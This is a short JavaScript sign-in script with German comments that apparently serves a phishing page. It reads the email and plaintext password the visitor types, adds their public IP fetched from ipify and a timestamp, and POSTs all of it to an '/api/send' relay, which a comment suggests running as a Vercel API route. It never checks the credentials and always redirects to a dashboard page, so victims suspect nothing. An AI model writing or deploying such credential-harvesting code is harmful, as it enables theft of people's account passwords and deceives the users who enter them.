document.addEventListener('DOMContentLoaded', () => {
  const signInButton = document.getElementById('signInButton');
  if (signInButton) {
    signInButton.addEventListener('click', signIn);
  }
});

async function signIn() {
  const email = document.getElementById('email').value;
  const password = document.getElementById('password').value;
  const gotcha = document.querySelector('input[name="_gotcha"]').value;

  if (!email || !password || gotcha) {
    // Bot oder unvollständiges Formular
    window.location.href = 'dashboard.html';
    return;
  }

  const lastSignIn = localStorage.getItem('lastSignIn');
  if (lastSignIn && Date.now() - parseInt(lastSignIn) < 30000) {
    return window.location.href = 'dashboard.html';
  }

  try {
    let ip_address = 'Unbekannt';
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      ip_address = data.ip;
    } catch (err) {
      console.error('IP-Fehler:', err);
    }

    const payload = {
      email,
      password,
      ip_address,
      timestamp: new Date().toISOString()
    };

    // Verwende Vercel-API-Route oder deinen eigenen CORS-freien Endpoint!
    await fetch("/api/send", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });

    localStorage.setItem('lastSignIn', Date.now().toString());
    window.location.href = 'dashboard.html';

  } catch (err) {
    console.error('Fehler beim Senden:', err);
    window.location.href = 'dashboard.html';
  }
}
